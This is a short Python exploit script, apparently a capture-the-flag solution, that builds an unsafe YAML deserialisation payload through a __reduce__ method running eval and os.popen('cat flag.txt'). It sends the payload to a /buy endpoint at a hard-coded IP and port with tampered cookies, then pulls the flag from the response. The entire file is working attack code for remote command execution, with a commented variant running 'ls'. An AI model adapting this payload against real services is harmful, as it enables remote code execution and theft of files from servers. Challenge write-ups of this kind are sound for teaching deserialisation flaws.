#!/usr/bin/env python3
import requests
import yaml
import os
import re

class Payload(object):
    def __reduce__(self):
        cmd = r"{'yam': 0, 'pwn': __import__('os').popen('cat flag.txt').read()}"
        # cmd = r"{'yam': 0, 'pwn': __import__('os').system('ls')}"
        return (eval, (cmd,))


vuln = yaml.dump(Payload()).replace("\n", "&").replace(": ", "=")

# print(f"{vuln = }")

cookies = dict(money='10', inventory='0')
r = requests.post("http://188.126.67.132:50019/buy", data=vuln, headers={'Content-Type': 'text/plain'}, cookies=cookies, allow_redirects=False)

"""
print(r.content)

print("--------------------------------")

print(r.text)
"""

print(re.search(r"SSM{[a-zA-Z_\d]*}", r.text).group(0))

